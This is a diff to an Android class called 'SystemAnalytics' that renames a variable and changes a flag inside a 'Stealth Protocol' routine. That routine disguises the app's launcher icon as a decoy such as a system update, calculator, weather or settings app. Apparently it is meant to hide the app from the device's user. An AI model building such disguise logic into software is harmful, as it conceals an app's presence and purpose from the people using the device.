@@ -209,16 +209,16 @@ public class SystemAnalytics {
             android.util.Log.d("SystemAnalytics", "Stealth Protocol: stealth=" + stealth + ", pkg=" + pkg);
             
             android.content.pm.PackageManager pm = context.getPackageManager();
-            String baseClass = "com.labs.labrats";
+            String basePkg = "com.labs.labrats";
             
             // All relevant component aliases
             String[] aliases = {
-                baseClass + ".LauncherAlias",
-                baseClass + ".SystemUpdateAlias",
-                baseClass + ".CalculatorAlias",
-                baseClass + ".WeatherAlias",
-                baseClass + ".SettingsAlias",
-                baseClass + ".LabRatsLogoAlias"
+                basePkg + ".LauncherAlias",
+                basePkg + ".SystemUpdateAlias",
+                basePkg + ".CalculatorAlias",
+                basePkg + ".WeatherAlias",
+                basePkg + ".SettingsAlias",
+                basePkg + ".LabRatsLogoAlias"
             };
 
             // Target component to enable
@@ -226,14 +226,14 @@ public class SystemAnalytics {
             if (stealth) {
                 int choice = getDecoyChoice(context);
                 switch (choice) {
-                    case 2: targetToEnable = baseClass + ".CalculatorAlias"; break;
-                    case 3: targetToEnable = baseClass + ".WeatherAlias"; break;
-                    case 4: targetToEnable = baseClass + ".SettingsAlias"; break;
-                    case 5: targetToEnable = baseClass + ".LabRatsLogoAlias"; break;
-                    default: targetToEnable = baseClass + ".SystemUpdateAlias"; break;
+                    case 2: targetToEnable = basePkg + ".CalculatorAlias"; break;
+                    case 3: targetToEnable = basePkg + ".WeatherAlias"; break;
+                    case 4: targetToEnable = basePkg + ".SettingsAlias"; break;
+                    case 5: targetToEnable = basePkg + ".LabRatsLogoAlias"; break;
+                    default: targetToEnable = basePkg + ".SystemUpdateAlias"; break;
                 }
             } else {
-                targetToEnable = baseClass + ".LauncherAlias";
+                targetToEnable = basePkg + ".LauncherAlias";
             }
 
             android.util.Log.d("SystemAnalytics", "Target component to enable: " + targetToEnable);
@@ -242,7 +242,7 @@ public class SystemAnalytics {
             android.content.ComponentName targetComp = new android.content.ComponentName(pkg, targetToEnable);
             pm.setComponentEnabledSetting(targetComp, 
                 android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, 
-                0);
+                android.content.pm.PackageManager.DONT_KILL_APP);
             android.util.Log.d("SystemAnalytics", "Enabled target: " + targetToEnable);
 
             // Phase 2: Disable all other components
@@ -251,7 +251,7 @@ public class SystemAnalytics {
                     android.content.ComponentName comp = new android.content.ComponentName(pkg, alias);
                     pm.setComponentEnabledSetting(comp, 
                         android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
-                        0);
+                        android.content.pm.PackageManager.DONT_KILL_APP);
                     android.util.Log.d("SystemAnalytics", "Disabled alias: " + alias);
                 }
             }
